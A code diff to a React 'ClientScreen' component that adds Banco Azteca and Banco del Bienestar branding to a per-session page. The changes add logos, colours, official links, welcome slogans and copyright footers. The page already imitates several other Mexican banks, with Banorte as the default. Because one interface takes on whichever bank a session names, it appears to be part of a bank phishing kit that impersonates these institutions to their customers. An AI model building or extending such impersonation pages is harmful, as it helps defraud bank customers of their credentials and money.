@@ -26,6 +26,8 @@ import invexLogoWhite from '../assets/invex_logo_white.png';
 import banregioLogo from '../assets/banregio_logo.png';
 import banregioLogoWhite from '../assets/banregio_logo_white.png';
 import platacardLogo from '../assets/platacard_logo.png';
+import bancoAztecaLogo from '../assets/banco_azteca_logo.png';
+import bienestarLogo from '../assets/banco_bienestar_logo.png';
 
 export default function ClientScreen() {
   // Verificar primero la ruta /client/:sessionId
@@ -358,6 +360,34 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'BANCO_AZTECA') {
+      return (
+        <header className="bg-[#00A552] text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={bancoAztecaLogo} 
+              className="banco-azteca-logo inline-block" 
+              alt="Banco Azteca" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
+    } else if (sessionData.banco === 'BIENESTAR') {
+      return (
+        <header className="bg-[#9D2449] text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={bienestarLogo} 
+              className="bienestar-logo inline-block" 
+              alt="Banco del Bienestar" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -409,6 +439,8 @@ export default function ClientScreen() {
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
               sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
+              sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :
+              sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -521,6 +553,8 @@ export default function ClientScreen() {
             sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
             sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
             sessionData.banco === 'PLATACARD' ? 'bg-[#333333]' :
+            sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
+            sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -608,6 +642,8 @@ export default function ClientScreen() {
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
               sessionData.banco === 'PLATACARD' ? 'Plata Card' :
+              sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :
+              sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -698,6 +734,18 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a Plata Card</p>
         </div>
       );
+    } else if (sessionData.banco === 'BANCO_AZTECA') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banco Azteca, el banco de la inclusión financiera</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BIENESTAR') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido al Banco del Bienestar, tu banco social</p>
+        </div>
+      );
     } else {
       return (
         <div className="text-center mt-4 px-4">
@@ -741,6 +789,8 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                 sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
                 sessionData.banco === 'PLATACARD' ? 'bg-[#FF5722]' :
+                sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
+                sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
